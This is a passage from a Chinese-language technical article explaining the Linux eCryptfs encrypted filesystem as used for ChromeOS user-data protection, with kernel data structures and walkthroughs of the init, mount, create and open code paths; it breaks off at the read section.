<h4 id="清单二-文件名的数据结构"><a href="#清单二-文件名的数据结构" class="headerlink" title="清单二 文件名的数据结构"></a>清单二 文件名的数据结构</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_filename</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">crypt_stat_list</span>;</span></span><br><span class="line">	u32 flags;</span><br><span class="line">	u32 seq_no;</span><br><span class="line">	<span class="keyword">char</span> *filename;</span><br><span class="line">	<span class="keyword">char</span> *encrypted_filename;</span><br><span class="line">	<span class="keyword">size_t</span> filename_size;</span><br><span class="line">	<span class="keyword">size_t</span> encrypted_filename_size;</span><br><span class="line">	<span class="keyword">char</span> fnek_sig[ECRYPTFS_SIG_SIZE_HEX];</span><br><span class="line">	<span class="keyword">char</span> dentry_name[ECRYPTFS_ENCRYPTED_DENTRY_NAME_LEN + <span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>&emsp;  struct ecryptfs_auth_tok用于记录认证令牌信息，包括用户口令和非对称加密两种类型，每种类型都包含有密钥的签名，用户口令类型还包含有算法类型和加盐值等，如清单三所示。为了方便管理，使用时统一将其保存在struct ecryptfs_auth_tok_list_item链表中。</p>
<h4 id="清单三-认证令牌信息的数据结构"><a href="#清单三-认证令牌信息的数据结构" class="headerlink" title="清单三 认证令牌信息的数据结构"></a>清单三 认证令牌信息的数据结构</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_auth_tok</span> &#123;</span></span><br><span class="line">	u16 version; <span class="comment">/* 8-bit major and 8-bit minor */</span></span><br><span class="line">	u16 token_type;</span><br><span class="line">	u32 flags;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_session_key</span> <span class="title">session_key</span>;</span></span><br><span class="line">	u8 reserved[<span class="number">32</span>];</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_password</span> <span class="title">password</span>;</span>  <span class="comment">//用户口令类型</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_private_key</span> <span class="title">private_key</span>;</span> <span class="comment">//非对称加密类型</span></span><br><span class="line">	&#125; token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_password</span> &#123;</span></span><br><span class="line">	u32 password_bytes;</span><br><span class="line">	s32 hash_algo;</span><br><span class="line">	u32 hash_iterations;</span><br><span class="line">	u32 session_key_encryption_key_bytes;</span><br><span class="line">	u32 flags;</span><br><span class="line">	<span class="comment">/* Iterated-hash concatenation of salt and passphrase */</span></span><br><span class="line">	u8 session_key_encryption_key[ECRYPTFS_MAX_KEY_BYTES];</span><br><span class="line">	u8 signature[ECRYPTFS_PASSWORD_SIG_SIZE + <span class="number">1</span>];</span><br><span class="line">	<span class="comment">/* Always in expanded hex */</span></span><br><span class="line">	u8 salt[ECRYPTFS_SALT_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_private_key</span> &#123;</span></span><br><span class="line">	u32 key_size;</span><br><span class="line">	u32 data_len;</span><br><span class="line">	u8 signature[ECRYPTFS_PASSWORD_SIG_SIZE + <span class="number">1</span>];</span><br><span class="line">	<span class="keyword">char</span> pki_type[ECRYPTFS_MAX_PKI_NAME_BYTES + <span class="number">1</span>];</span><br><span class="line">	u8 data[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>&emsp;  eCryptfs在mount时会传入全局加解密用到密钥、算法相关数据，并将其保存在struct ecryptfs_mount_crypt_stat，如清单四所示</p>
<h4 id="清单四-mount时传入的密钥相关数据结构"><a href="#清单四-mount时传入的密钥相关数据结构" class="headerlink" title="清单四 mount时传入的密钥相关数据结构"></a>清单四 mount时传入的密钥相关数据结构</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_mount_crypt_stat</span> &#123;</span></span><br><span class="line">	u32 flags;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">global_auth_tok_list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">global_auth_tok_list_mutex</span>;</span></span><br><span class="line">	<span class="keyword">size_t</span> global_default_cipher_key_size;</span><br><span class="line">	<span class="keyword">size_t</span> global_default_fn_cipher_key_bytes;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> global_default_cipher_name[ECRYPTFS_MAX_CIPHER_NAME_SIZE + <span class="number">1</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> global_default_fn_cipher_name[</span><br><span class="line">		ECRYPTFS_MAX_CIPHER_NAME_SIZE + <span class="number">1</span>];</span><br><span class="line">	<span class="keyword">char</span> global_default_fnek_sig[ECRYPTFS_SIG_SIZE_HEX + <span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>&emsp;  eCryptfs读写文件时首先需要进行加/解密，此时使用的密钥相关数据保存在struct ecryptfs_crypt_stat结构中，其具体数值在open时初始化，部分从mount时的ecryptfs_mount_crypt_stat复制过来，部分从分析加密文件的metadata获取，该数据结构比较关键，贯穿eCryptfs的文件open、read、write、close等流程，如清单五所示。</p>
<h4 id="清单五-ecryptfs-crypt-stat数据结构"><a href="#清单五-ecryptfs-crypt-stat数据结构" class="headerlink" title="清单五 ecryptfs_crypt_stat数据结构"></a>清单五 ecryptfs_crypt_stat数据结构</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_crypt_stat</span> &#123;</span></span><br><span class="line">	u32 flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> file_version;</span><br><span class="line">	<span class="keyword">size_t</span> iv_bytes;</span><br><span class="line">	<span class="keyword">size_t</span> metadata_size;</span><br><span class="line">	<span class="keyword">size_t</span> extent_size; <span class="comment">/* Data extent size; default is 4096 */</span></span><br><span class="line">	<span class="keyword">size_t</span> key_size;</span><br><span class="line">	<span class="keyword">size_t</span> extent_shift;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> extent_mask;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_mount_crypt_stat</span> *<span class="title">mount_crypt_stat</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">crypto_ablkcipher</span> *<span class="title">tfm</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">crypto_hash</span> *<span class="title">hash_tfm</span>;</span> <span class="comment">/* Crypto context for generating</span></span><br><span class="line"><span class="comment">				       * the initialization vectors */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> cipher[ECRYPTFS_MAX_CIPHER_NAME_SIZE + <span class="number">1</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> key[ECRYPTFS_MAX_KEY_BYTES];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> root_iv[ECRYPTFS_MAX_IV_BYTES];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">keysig_list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">keysig_list_mutex</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">cs_tfm_mutex</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">cs_hash_tfm_mutex</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">cs_mutex</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="eCryptfs-init过程-回页首"><a href="#eCryptfs-init过程-回页首" class="headerlink" title="eCryptfs init过程 回页首"></a>eCryptfs init过程 <a href="#top">回页首</a></h3><p><span id="ecryptfs-init"></span></p>
<p>&emsp;  使用eCryptfs前，首先需要通过内核的配置选项“CONFIG_ECRYPT_FS=y”使能eCryptfs，因为加解密时使用到内核的crypto和keystore接口，所以要确保“CONFIG_CRYPTO=y”，“CONFIG_KEYS=y”，“CONFIG_ENCRYPTED_KEYS=y”，同时使能相应的加解密算法，如AES等。重新编译内核启动后会自动注册eCryptfs，其init的代码如清单六所示。</p>
<h4 id="清单六-eCryptfs-init过程"><a href="#清单六-eCryptfs-init过程" class="headerlink" title="清单六 eCryptfs init过程"></a>清单六 eCryptfs init过程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">ecryptfs_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> rc;</span><br><span class="line">	<span class="comment">//eCryptfs的extent size不能大于page size</span></span><br><span class="line">	<span class="keyword">if</span> (ECRYPTFS_DEFAULT_EXTENT_SIZE &gt; PAGE_CACHE_SIZE) &#123;</span><br><span class="line">		rc = -EINVAL;  ecryptfs_printk(KERN_ERR，…); 	<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/*为上文列举到的eCryptfs重要的数据结构对象申请内存，如eCryptfs的auth token、superblock、inode、dentry、file、key	等*/</span></span><br><span class="line">	rc = ecryptfs_init_kmem_caches(); </span><br><span class="line">	…</span><br><span class="line"> 	<span class="comment">//建立sysfs接口，该接口中的version各bit分别代表eCryptfs支持的能力和属性</span></span><br><span class="line">	rc = do_sysfs_registration(); </span><br><span class="line">	…</span><br><span class="line">	<span class="comment">//建立kthread，为后续eCryptfs读写lower file时能借助内核函数得到rw的权限</span></span><br><span class="line">	rc = ecryptfs_init_kthread();</span><br><span class="line">	…</span><br><span class="line">	<span class="comment">//在chromeos中该函数为空，直接返回0	</span></span><br><span class="line">	rc = ecryptfs_init_messaging();</span><br><span class="line">	…</span><br><span class="line">	<span class="comment">//初始化kernel crypto</span></span><br><span class="line">	rc = ecryptfs_init_crypto();</span><br><span class="line">	…</span><br><span class="line">	<span class="comment">//注册eCryptfs文件系统</span></span><br><span class="line">	rc = register_filesystem(&amp;ecryptfs_fs_type);</span><br><span class="line">	…</span><br><span class="line">	<span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="eCryptfs-mount过程-回页首"><a href="#eCryptfs-mount过程-回页首" class="headerlink" title="eCryptfs mount过程 回页首"></a>eCryptfs mount过程 <a href="#top">回页首</a></h3><p><span id="ecryptfs-mount"></span></p>
<p>&emsp;  在使能了eCryptfs的内核，当用户在应用层下发“mount –t ecryptfs src dst options”指令时触发执行上文清单一中的ecryptfs_mount函数进行文件系统的挂载安装并初始化auth token，成功执行后完成对src目录的eCryptfs属性的指定，eCryptfs开始正常工作，此后任何在src目录下新建的文件都会被自动加密处理，若之前该目录已有加密文件，此时会被自动解密。<br>&emsp;  ecryptfs_mount涉及的代码比较多，篇幅有限，化繁为简，函数调用关系如图五所示。</p>
<center>          
![](ecryptfs-mount.png "图五")   
图五 eCryptfs mount的函数调用关系图
</center>

<p>&emsp;  从图五可看到mount时首先利用函数ecryptfs_parse_options()对传入的option参数做解析，完成了如下事项：    </p>
<ol>
<li>调用函数ecryptfs_init_mount_crypt_stat()初始化用于保存auth token相关的 struct ecryptfs_mount_crypt_stat 对象；    </li>
<li>调用函数ecryptfs_add_global_auth_tok()将从option传入的分别用于FEK和FNEK（File Name Encryption Key，用于文件名加解密）的auth token的signature保存到struct ecryptfs_mount_crypt_stat 对象；    </li>
<li>分析option传入参数，初始化struct ecryptfs_mount_crypt_stat 对象的成员，如global_default_cipher_name、global_default_cipher_key_size、flags、global_default_fnek_sig、global_default_fn_cipher_name、global_default_fn_cipher_key_bytes等；    </li>
<li>调用函数ecryptfs_add_new_key_tfm()针对FEK和FNEK的加密算法分别初始化相应的kernel crypto tfm接口；    </li>
<li>调用函数ecryptfs_init_global_auth_toks()将解析option后得到key sign做为参数利用keyring的request_key接口获取上层应用传入的auth token，并将auth token添加入struct ecryptfs_mount_crypt_stat 的全局链表中，供后续使用。<br>&emsp;  接着为eCryptfs创建superblock对象并初始化，具体如下：通过函数sget()创建eCryptfs类型的superblock；调用bdi_setup_and_register()函数为eCryptfs的ecryptfs_sb_info 对象初始化及注册数据的回写设备bdi；初始化eCryptfs superblock对象的各成员，如s_fs_info、s_bdi、s_op、s_d_op等；然后获取当前挂载点的path并判断是否已经是eCryptfs，同时对执行者的权限做出判断；再通过ecryptfs_set_superblock_lower()函数将eCryptfs的superblock和当前挂载点上底层文件系统对应的VFS superblock产生映射关系；根据传入的mount option参数及VFS映射点superblock的值初始化eCryptfs superblock对象flag成员，如关键的MS_RDONLY属性；根据VFS映射点superblock的值初始化eCryptfs superblock对象的其他成员 ，如s_maxbytes、s_blocksize、s_stack_depth；最后设置superblock对象的s_magic为ECRYPTFS_SUPER_MAGIC。这可看出eCryptfs在Linux kernel的系统架构中，其依赖于VFS并处于VFS之下层，实际文件系统之上层。<br>&emsp;  下一步到创建eCryptfs的inode并初始化，相应工作通过函数ecryptfs_get_inode()完成，具体包括：首先获取当前挂载点对应的VFS的inode；然后调用函数iget5_locked()在挂载的fs中获取或创建一个eCryptfs的inode，并将该inode与挂载点对应的VFS的inode建立映射关系，与superblock类似，eCryptfs的inode对象的部分初始值从其映射的VFS inode中拷贝，inode operation由函数ecryptfs_inode_set()发起初始化，根据inode是符号链接还是目录文件还是普通文件分别进行不同的i_op 赋值，如ecryptfs_symlink_iops/ecryptfs_dir_iops/ecryptfs_main_iops；同时对i_fop file_operations进行赋值，如ecryptfs_dir_fops/ecryptfs_main_fops 。<br>&emsp;  然后调用d_make_root()函数为之前创建的superblock设置eCryptfs的根目录s_root。<br>&emsp;  最后通过ecryptfs_set_dentry_private()函数为eCryptfs设置dentry。</li>
</ol>
<h3 id="加密文件creat过程-回页首"><a href="#加密文件creat过程-回页首" class="headerlink" title="加密文件creat过程 回页首"></a>加密文件creat过程 <a href="#top">回页首</a></h3><p><span id="ecryptfs-file-creat"></span></p>
<p>&emsp;  creat过程特指应用层通过creat系统调用创建一个新的加密文件的流程。以应用程序通过creat()函数在以eCryptfs挂载的目录下创建加密文件为例，其函数调用流程如图六所示，creat()通过系统调用进入VFS，后经过层层函数调用，最终调用到eCryptfs层的ecryptfs_create()函数，该部分不属于eCryptfs的重点，不详述。</p>
<center>          
![](ecryptfs-file-creat.png "图六")   
图六 create经由VFS调用ecryptfs_create的流程

<p><img src="/2017/10/ChromeOs-Userdata-Protection-Mechanism-Based-On-eCryptfs/ecryptfs-create-func.png" alt title="图七"><br>图七 eCryptfs创建加密文件的函数调用过程</p>
</center>

<p>&emsp;  eCryptfs层通过ecryptfs_create() 函数完成最终的加密文件的创建，关键代码的调用流程如图七所示，以代码做为视图，分为三大步骤：一、通过ecryptfs_do_create()函数创建eCryptfs 文件的inode并初始化；二、通过函数ecryptfs_initialize_file()将新创建的文件初始化成eCryptfs加密文件的格式，添加入诸如加密算法、密钥信息等，为后续的读写操作初始化好crypto接口；三、通过d_instantiate()函数将步骤一生成的inode信息初始化相应的dentry。具体如下：<br>一．为新文件创建inode<br>&emsp;  首先借助ecryptfs_dentry_to_lower()函数根据eCryptfs和底层文件系统（在chromeos里就是ext4）的映射关系获取到底层文件系统的dentry值。然后调用vfs_create()函数在底层文件系统上创建inode，紧接着利用__ecryptfs_get_inode()函数创建eCryptfs的inode 对象并初始化以及建立其与底层文件系统inode间的映射关系，之后通过fsstack_copy_attr_times()、fsstack_copy_inode_size()函数利用底层文件系统的inode对象的值初始化eCryptfs inode的相应值。<br>二．初始化eCryptfs新文件<br>&emsp;  经过步骤一完成了在底层文件系统上新建了文件，现在通过函数ecryptfs_initialize_file()将该文件设置成eCryptfs加密文件的格式。    </p>
<ol>
<li>ecryptfs_new_file_context()函数完成初始化文件的context，主要包括加密算法cipher、auth token、生成针对文件加密的随机密钥等，这里使用的关键数据结构是struct ecryptfs_crypt_stat，具体如清单五所示，初始化文件的context基本可以看成是初始化struct ecryptfs_crypt_stat对象，该对象的cipher、auth token、key sign等值从mount eCryptfs传入的option并保存在struct ecryptfs_mount_crypt_stat （详见清单四）对象中获取。具体是：首先由ecryptfs_set_default_crypt_stat_vals()函数完成flags、extent_size、metadata_size、cipher、key_size、file_version、mount_crypt_stat等ecryptfs_crypt_stat对象的缺省值设置；然后再通过ecryptfs_copy_mount_wide_flags_to_inode_flags()函数根据mount时设置的ecryptfs_mount_crypt_stat的flags重新设置ecryptfs_crypt_stat对象flags；接着由ecryptfs_copy_mount_wide_sigs_to_inode_sigs()函数将mount时保存的key sign赋值给ecryptfs_crypt_stat对象的keysig_list中的节点对象中的keysig；然后继续将ecryptfs_mount_crypt_stat的cipher、key_size等值赋给ecryptfs_crypt_stat对象中的相应值；再调用函数ecryptfs_generate_new_key()生成key并保存到ecryptfs_crypt_stat对象的key；最后通过ecryptfs_init_crypt_ctx()函数完成kernel crypto context的初始化，如tfm，为后续的写操作时的加密做好准备。    </li>
<li>ecryptfs_get_lower_file()通过调用底层文件系统的接口打开文件，需要注意的是ecryptfs_privileged_open()，该函数唤醒了上文清单六提到kthread，借助该内核线程，eCryptfs巧妙避开了底层文件的读写权限的限制。    </li>
<li>ecryptfs_write_metadata()完成关键的写入eCryptfs文件格式到新创建的文件中。<br>&emsp;  关键函数ecryptfs_write_headers_virt()的代码如清单七所示，eCryptfs保存格式如清单七的注释（也可参考上文的图四），其格式传承自OpenPGP，最后在ecryptfs_generate_key_packet_set()完成EFEK的生成，并根据token_type的类型是ECRYPTFS_PASSWORD还是ECRYPTFS_PRIVATE_KEY生成不同的OpenPGP的Tag，之后保存到eCryptfs文件头部bytes 26开始的地方。这里以ECRYPTFS_PASSWORD为例，因此bytes 26地址起存放的内容是Tag3和Tag11，对应着EFEK和Key sign。否则保存的是Tag1，即EFEK。Tag3或Tag1的具体定义详见OpenPGP的描述文档RFC2440.<br>&emsp;  之后将生成的eCryptfs文件的头部数据保存到底层文件系统中，该工作由ecryptfs_write_metadata_to_contents()完成。    </li>
<li>最后通过ecryptfs_put_lower_file()将文件改动的所有脏数据回写入磁盘。<br>三．最后通过d_instantiate()函数将步骤一生成的inode信息初始化相应的dentry，方便后续的读写操作。<h4 id="清单七-写入eCryptfs格式文件的关键函数"><a href="#清单七-写入eCryptfs格式文件的关键函数" class="headerlink" title="清单七 写入eCryptfs格式文件的关键函数"></a>清单七 写入eCryptfs格式文件的关键函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Format version: 1</span></span><br><span class="line"><span class="comment">*   Header Extent:</span></span><br><span class="line"><span class="comment"> *     Octets 0-7:        Unencrypted file size (big-endian)</span></span><br><span class="line"><span class="comment"> *     Octets 8-15:       eCryptfs special marker</span></span><br><span class="line"><span class="comment"> *     Octets 16-19:      Flags</span></span><br><span class="line"><span class="comment"> *      Octet 16:         File format version number (between 0 and 255)</span></span><br><span class="line"><span class="comment"> *      Octets 17-18:     Reserved</span></span><br><span class="line"><span class="comment"> *      Octet 19:         Bit 1 (lsb): Reserved</span></span><br><span class="line"><span class="comment"> *                        Bit 2: Encrypted?</span></span><br><span class="line"><span class="comment"> *                        Bits 3-8: Reserved</span></span><br><span class="line"><span class="comment"> *     Octets 20-23:      Header extent size (big-endian)</span></span><br><span class="line"><span class="comment"> *     Octets 24-25:      Number of header extents at front of file (big-endian)</span></span><br><span class="line"><span class="comment"> *     Octet  26:        Begin RFC 2440 authentication token packet set</span></span><br><span class="line"><span class="comment"> *   Data Extent 0:        Lower data (CBC encrypted)</span></span><br><span class="line"><span class="comment"> *   Data Extent 1:        Lower data (CBC encrypted)</span></span><br><span class="line"><span class="comment"> *   ...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ecryptfs_write_headers_virt</span><span class="params">(<span class="keyword">char</span> *page_virt, <span class="keyword">size_t</span> <span class="built_in">max</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">				       <span class="keyword">size_t</span> *<span class="built_in">size</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">				       struct ecryptfs_crypt_stat *crypt_stat,</span></span></span><br><span class="line"><span class="function"><span class="params">				       struct dentry *ecryptfs_dentry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> rc;</span><br><span class="line">	<span class="keyword">size_t</span> written;</span><br><span class="line">	<span class="keyword">size_t</span> offset;</span><br><span class="line"></span><br><span class="line">	offset = ECRYPTFS_FILE_SIZE_BYTES;</span><br><span class="line">	write_ecryptfs_marker((page_virt + offset), &amp;written);</span><br><span class="line">	offset += written;</span><br><span class="line">	ecryptfs_write_crypt_stat_flags((page_virt + offset), crypt_stat,</span><br><span class="line">					&amp;written);</span><br><span class="line">	offset += written;</span><br><span class="line">	ecryptfs_write_header_metadata((page_virt + offset), crypt_stat,</span><br><span class="line">				       &amp;written);</span><br><span class="line">	offset += written;</span><br><span class="line">	rc = ecryptfs_generate_key_packet_set((page_virt + offset), crypt_stat,</span><br><span class="line">					      ecryptfs_dentry, &amp;written,</span><br><span class="line">					      <span class="built_in">max</span> - offset);</span><br><span class="line">	…</span><br><span class="line">	<span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="加密文件open过程-回页首"><a href="#加密文件open过程-回页首" class="headerlink" title="加密文件open过程 回页首"></a>加密文件open过程 <a href="#top">回页首</a></h3><p><span id="ecryptfs-file-open"></span></p>
<p>&emsp;  这里open过程主要指通过open系统调用打开一个已存在的加密文件的流程。当应用程序在已完成eCryptfs挂载的目录下open一个已存在的加密文件时（这里以普通文件为例），其系统调用流程如图八所示，经由层层调用后进入ecryptfs_open()函数，由其完成加密文件的metadata分析，然后取出EFEK并使用kernel crypto解密得到FEK。另外在文中”create过程”分析时，着重介绍了创建eCryptfs格式文件的过程，省略了在完成lookup_open()函数调用后的vfs_open()的分析，它与这里介绍的vfs_open()流程是一样的。需要特别指出的是在do_dentry_open函数里初始化了struct file的f_mapping成员，让其指向inode-&gt;i_mapping；而在上图五的inode的创建函数ecryptfs_inode_set中存在”inode-&gt;i_mapping-&gt;a_ops = &amp;ecryptfs_aops”的赋值语句，这为后续的加密文件的页读写时使用的关键对象struct address_space_operations a_ops做好了初始化。<br>&emsp;  下面重点介绍ecryptfs_open()函数，其主要的函数调用关系如图九所示。eCryptfs支持Tag3和Tag1的形式保存EFEK，这里的分析默认是采用了Tag3的方式。</p>
<center>          
![](ecryptfs-open.png "图八")   
图八 create经由VFS调用ecryptfs_create的流程

<p><img src="/2017/10/ChromeOs-Userdata-Protection-Mechanism-Based-On-eCryptfs/ecryptfs-open-func.png" alt title="图九"><br>图九 eCryptfs创建加密文件的函数调用过程</p>
</center>

<p>&emsp;  ecryptfs_open()函数的完成的主要功能包括读取底层文件，分析其文件头部的metadata，取出关键的EFEK及key sign，之后根据key sign从ecryptfs_mount_crypt_stat对象中匹配到相应的auth token，再调用kernel crypto解密EFEK得到FEK，最后将FEK保存到ecryptfs_crypt_stat的key成员中，完成ecryptfs_crypt_stat对象的初始化，供后续的文件加解密使用。具体如下：     </p>
<ol>
<li>ecryptfs_set_file_private()巧妙的将struct ecryptfs_file_info保存到struct file的private_data中，完成VFS和eCryptfs之间的链式表达及映射；    </li>
<li>ecryptfs_get_lower_file()借助kthread 内核线程巧妙的获取到底层文件的RW权限；     </li>
<li>ecryptfs_set_file_lower()完成struct ecryptfs_file_info的wfi_file和底层文件系统文件lower_file之间的映射；    </li>
<li>read_or_initialize_metadata()完成了ecryptfs_open的大部分功能，首先通过ecryptfs_copy_mount_wide_flags_to_inode_flags()从文件对应的ecryptfs_mount_crypt_stat中拷贝flags对ecryptfs_crypt_stat的flags进行初始化；之后使用函数ecryptfs_read_lower()读取文件的头部数据，紧接着利用ecryptfs_read_headers_virt()进行数据分析和处理，包括：<br>1) 利用ecryptfs_set_default_sizes()初始化ecryptfs_crypt_stat对象的extent_size、iv_bytes、metadata_size等成员的默认值;<br>2) 使用ecryptfs_validate_marker()校验文件的marker标记值是否符合eCryptfs文件格式；<br>3) 通过ecryptfs_process_flags()取出文件metadata保存的flag并修正ecryptfs_crypt_stat对象成员flags的值,同时初始化对象成员file_version；<br>4) 在parse_header_metadata()分析文件的metadata的大小并保存到ecryptfs_crypt_stat对象成员metadata_size；<br>5) 通过ecryptfs_parse_packet_set()解析Tag3和Tag11的OpenPGP格式包，获取EFEK及key sign，后根据key sign匹配到auth token，再调用kernel crypto解密EFEK得到FEK。对应的代码实现逻辑是：parse_tag_3_packet()解析Tag3，获取EFEK和cipher，同时将cipher保存到ecryptfs_crypt_stat对象成员cipher；parse_tag_11_packet()解析出key sign，保存到auth_tok_list链表中；ecryptfs_get_auth_tok_sig()从auth_tok_list链表中获取到key sign;然后通过ecryptfs_find_auth_tok_for_sig()根据key sign从ecryptfs_mount_crypt_stat对象中匹配到相应的auth token；再利用decrypt_passphrase_encrypted_session_key()使用分析得到的auth token、cipher解密出FEK，并将其保存在ecryptfs_crypt_stat的key成员；之后在ecryptfs_compute_root_iv()函数里初始化ecryptfs_crypt_stat的root_iv成员，在ecryptfs_init_crypt_ctx()函数里初始化ecryptfs_crypt_stat的kernel crypto接口tfm。至此，ecryptfs_crypt_stat对象初始化完毕，后续文件在读写操作时使用到的加解密所需的所有信息均在该对象中获取。</li>
</ol>
<h3 id="加密文件read过程-回页首"><a href="#加密文件read过程-回页首" class="headerlink" title="加密文件read过程 回页首"></a>加密文件read过程 <a href="#top">回页首</a></h3><p><span id="ecryptfs-file-read"></span></p>
